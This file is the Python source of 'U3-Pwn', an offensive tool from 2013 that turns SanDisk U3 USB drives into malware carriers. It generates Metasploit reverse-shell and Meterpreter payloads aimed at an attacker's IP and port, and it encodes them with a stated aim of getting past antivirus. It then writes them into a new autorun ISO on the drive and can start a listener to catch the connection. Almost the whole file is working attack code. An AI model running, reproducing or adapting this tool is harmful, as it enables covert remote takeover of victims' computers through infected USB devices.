#!/usr/bin/env python
################################################################################
#                ____                     _ __                                 #
#     ___  __ __/ / /__ ___ ______ ______(_) /___ __                           #
#    / _ \/ // / / (_-</ -_) __/ // / __/ / __/ // /                           #
#   /_//_/\_,_/_/_/___/\__/\__/\_,_/_/ /_/\__/\_, /                            #
#                                            /___/ team                        #
#                                                                              #
# U3-Pwn                                                                       #
#                                                                              #
# DATE                                                                         #
# 10/05/2013                                                                   #
#                                                                              #
# DESCRIPTION                                                                  #
# U3-Pwn is a tool designed to automate injecting executables to Sandisk       #
# smart usb devices with default U3 software install. This is performed by     #
# removing the original iso file from the device and creating a new iso        #
# with autorun features.                                                       #
#                                                                              #
# REQUREMENTS                                                                  #
# - Metasploit                                                                 #
# - U3-Tool                                                                    #
# - Python-2.7                                                                 #
#                                                                              #
# AUTHOR                                                                       #
# Zy0d0x - http://www.nullsecurity.net/                                        #
#                                                                              #
################################################################################

try:
    import subprocess
    import pexpect
    import time
    import os
    import sys
    import shutil
    import banner
    import socket
except ImportError, error:
    print'\n [-]Failed To Import Module\n'
    print error

definepath = os.getcwd()
sys.path.append('%s/src/' % definepath)


try:
    banner.print_banner()
    print ' Detecting Device...\n'
    u3 = ['5406', '5408', '5151', '5530', '5535', '550a', '540e'];
    for id in u3:
        try:
             device = subprocess.check_output("lsusb -d 0781:%s" %(id),  shell=True)
	     print ' Device Found:', device
        except Exception, error:
            pass

    time.sleep(2)
    banner.print_banner()
    print ' Detecting Partitions...'
    time.sleep(2)
    partitionsFile = open("/proc/partitions")
    lines = partitionsFile.readlines()[2:]

    for line in lines:
    	words = [x.strip() for x in line.split()]
    	minorNumber = int(words[1])
    	deviceName = words[3]
    	if minorNumber % 16 == 0:
           path = "/sys/class/block/" + deviceName
           if os.path.islink(path):
              if os.path.realpath(path).find("/usb") > 0:
		 if deviceName.startswith("sd"):
		    print "\n Partition Found: /dev/%s1" % deviceName
		    time.sleep(2)


except Exception, error:
    print ' [-]Something went wrong, printing error message..'
    print error
    time.sleep(2)
    sys.exit(0)

try:
    banner.print_banner()
    shellcode = ['windows/shell/reverse_tcp', 
		 'windows/meterpreter/reverse_tcp', 
		 'windows/vncinject/reverse_tcp', 
		 'windows/shell/bind_tcp', 
		 'windows/x64/shell/reverse_tcp',
		 'windows/meterpreter/reverse_https',
		 'windows/meterpreter/reverse_dns' ];

    payload = raw_input(''' What payload do you want to generate:

 Name:                                         Description:
 -----                                         ------------

 1. Windows Shell Reverse_TCP                   Windows Command Shell, Reverse TCP Stager   
 2. Windows Reverse_TCP Meterpreter             Windows Meterpreter (Reflective Injection), Reverse TCP Stager
 3. Windows Reverse_TCP VNC DLL                 VNC Server (Reflective Injection), Reverse TCP Stager
 4. Windows Bind Shell                          Windows Command Shell, Bind TCP Stager
 7. Windows Meterpreter Reverse_TCP X64         Windows x64 Meterpreter, Windows x64 Reverse TCP Stager      
 8. Windows Meterpreter Reverse HTTPS           Windows Meterpreter (Reflective Injection), Reverse HTTPS Stager  
 9. Windows Meterpreter Reverse DNS             Windows Meterpreter (Reflective Injection), Reverse TCP Stager (DNS)
      
 Enter number: ''').strip()

    try:
	  #only accept integer's
	  payload = int(payload)
	  if (payload > 0) and (payload < 10):
	      shellcode[payload-1]
    except ValueError:
	pass

    while True:
    #Loop to check user input if value is correct else loop 
	  try: 
	      int(payload)
	      while int(payload) not in range(1, 10): 
		  payload = raw_input(' Enter number:')  
	      break
                 
	  except ValueError: 
	      payload  = raw_input(' Enter number:')
	      try:
		  #only accept integer's
		  payload = int(payload)
		  if (payload > 0) and (payload < 10):
		    shellcode[payload-1]
              except ValueError:
	          pass

except KeyboardInterrupt:
    print ' [-]Keyboard Interrupt Detected Exiting'
    time.sleep(2)
    sys.exit(0)

except Exception, error:
    print ' [-]Something went wrong, printing error message..'
    print error
    time.sleep(2)
    sys.exit(0)



try:
    banner.print_banner()
    #List of available encoders
    encoders = [ 'x86/shikata_ga_nai',  
		 'x86/alpha_mixed', 
		 'x86/alpha_upper', 
		 'x86/call4_dword_xor', 
		 'x86/countdown', 
		 'x86/fnstenv_mov', 
		 'x86/jmp_call_additive'];

    encode = raw_input(''' What encoder would you like to try and bypass AV with.
    
 Name:                              Description:
 -----                              -----------
     
 1. shikata_ga_nai                  Polymorphic XOR Additive Feedback Encoder 
 2. alpha_mixed                     Alpha2 Alphanumeric Mixedcase Encoder
 3. alpha_upper                     Alpha2 Alphanumeric Uppercase Encoder  
 4. call4_dword_xor                 Call+4 Dword XOR Encoder  
 5. countdown                       Single-byte XOR Countdown Encoder  
 6. fnstenv_mov                     Variable-length Fnstenv/mov Dword XOR Encoder  
 7. jmp_call_additive               Jump/Call XOR Additive Feedback Encoder  
 

    
 Enter number: ''').strip()
    try:
	#only accept integer's
	encode = int(encode)
	if (encode > 0) and (encode < 8):
	    encoders[encode-1]
    except ValueError:
	pass

    while True:
    #Loop to check user input if value is correct else loop 
	  try: 
	      int(encode)
	      while int(encode) not in range(1, 8): 
		  encode = raw_input(' Enter number:')  
	      break
                 
	  except ValueError: 
	      encode  = raw_input(' Enter number:')
	      try:
		  #only accept integer's
		  encode = int(encode)
		  if (encode > 0) and (encode < 8):
		    encoders[encode-1]
	      except ValueError:
		  pass
    
except KeyboardInterrupt:
    print ' [-]Keyboard Interrupt Detected Exiting'
    time.sleep(2)
    sys.exit(0)
except Exception, error:
    print ' [-]Something went wrong, printing error message..'
    print error
    time.sleep(2)
    sys.exit(0)


while True:
    banner.print_banner()
    addr = raw_input(' Please Enter Ip addr: ')    
    try:
        if addr is not socket.inet_aton(addr):
	   banner.print_banner()	  
           port = raw_input(' Please Enter Port No: ')
	   if port is not socket.inet_aton(port):
		banner.print_banner()
                print ' Generating Shellcode Please Wait...'
                subprocess.Popen('msfpayload %s EXITFUNC=thread  LHOST=%s LPORT=%s R  | msfencode -c 2 -e %s -t raw  | msfencode  -a x86 -e  x86/alpha_mixed -t raw BufferRegister=EAX > resource/payload.txt' % (shellcode[payload-1], addr, port,  encoders[encode-1] ), stdout=subprocess.PIPE, stderr=subprocess.PIPE,shell=True).wait()
                alpha = open('resource/payload.txt', 'r')
                text = alpha.readline()
                file = open('resource/LaunchU3.bat', 'w')
                file.write('LaunchU3.exe ' + text)
                file.close()
                os.remove('resource/payload.txt')
                shutil.copy('backup/LaunchU3.exe', 'resource/LaunchU3.exe')
                subprocess.Popen('genisoimage -volid U3\ System -o resource/U3\ System.iso resource/' , stderr=subprocess.PIPE,shell=True).wait()
                banner.print_banner()
                print ' Creating a new partition of 1302528 bytes on /dev/%s\n' % deviceName
                child1 = pexpect.spawn('u3-tool -v  -p 1302528 /dev/%s' + deviceName)
                child1.sendline('y')
                time.sleep(5)
                print' Partitioning completed on /dev/%s' % deviceName
                banner.print_banner()
                print' Replacing Iso on /dev/%s' % deviceName
                subprocess.Popen('u3-tool -v -l resource/U3\ System.iso /dev/%s' % deviceName, shell=True).wait()
	break
    except socket.error:
        print' Error incorrect IP address or port number'
	time.sleep(2)
    except Exception, error:
        print ' [-]Something went wrong, printing error message..'
        print error
        time.sleep(2)
        sys.exit(0)

		

try:
    banner.print_banner()
    os.remove('resource/LaunchU3.exe')
    os.system('rm resource/U3\ System.iso')
    os.remove('resource/LaunchU3.bat')
    listener = raw_input(' Do you want to start a listener to receive the payload yes or no: ')

    if listener == 'yes' or listener == 'y':
	banner.print_banner()
        subprocess.Popen('msfcli exploit/multi/handler PAYLOAD=%s LHOST=0.0.0.0 LPORT=%s E' % (shellcode[payload-1], port), shell=True).wait()

    else:
	  banner.print_banner()
	  print' Generation Complete Exiting..'
	  time.sleep(2)
	  sys.exit(0)

except Exception, error:
    print ' [-]Something went wrong, printing error message..'
    print error
    time.sleep(2)
    sys.exit(0)
